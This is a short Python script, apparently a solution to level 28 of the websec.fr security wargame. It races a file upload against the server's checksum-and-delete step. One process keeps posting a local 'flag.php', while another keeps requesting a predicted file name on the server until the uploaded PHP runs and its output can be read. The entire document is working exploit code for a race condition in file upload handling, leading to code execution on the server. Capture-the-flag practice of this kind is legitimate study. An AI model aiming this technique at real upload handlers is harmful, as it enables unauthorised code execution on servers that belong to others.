from requests import *
import sys
from multiprocessing import Process

def upload_file():
    while(True):
        url = 'https://websec.fr/level28/index.php'
        data = {
            'checksum' : '123',
            'submit' : 'Upload and check'
        }
        with open('flag.php' , 'rb') as flag_file:
            files = {
                'flag_file' : flag_file
            }
            post(url , data=data , files=files)
            print('success')

def get_flag():
    while(True):
        url = 'https://websec.fr/level28/99469073825a2c15a88d9389f504f1bc.php'
        r = get(url)
        if (r.status_code != 404):
            print(r.text)
            sys.exit()
        else:
            print('404')

p1 = Process(target = upload_file)
p2 = Process(target = get_flag)

p1.start()
p2.start()